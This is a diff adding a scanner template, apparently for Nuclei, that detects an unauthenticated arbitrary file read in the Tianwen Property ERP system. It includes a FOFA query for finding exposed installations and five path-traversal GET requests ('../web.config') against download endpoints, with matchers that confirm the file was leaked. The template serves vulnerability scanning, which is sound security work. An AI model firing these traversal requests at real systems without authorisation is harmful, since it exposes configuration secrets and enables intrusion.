@@ -1,0 +1,34 @@
+id: tianwen-erp-lfi
+
+info:
+  name: Tianwen Property ERP Arbitrary File Read
+  author: Co5mos
+  severity: critical
+  description: |
+    天问物业ERP系统的 `ContractDownLoad.aspx`, `OwnerVacantDownLoad.aspx`, `VacantDiscountDownLoad.aspx` 接口存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
+  metadata:
+    fofa-query: 'body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"'
+  tags: tianwen, lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config"
+      - "{{BaseURL}}/HM/M_main/InformationManage/OwnerVacantDownLoad.aspx?OwnerVacantFile=../web.config"
+      - "{{BaseURL}}/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config"
+      - "{{BaseURL}}/HM/M_Main/InformationManage/PlanDownLoad.aspx?PlanFile=../web.config"
+      - "{{BaseURL}}/HM/M_Main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "<system.web>"
+        condition: and
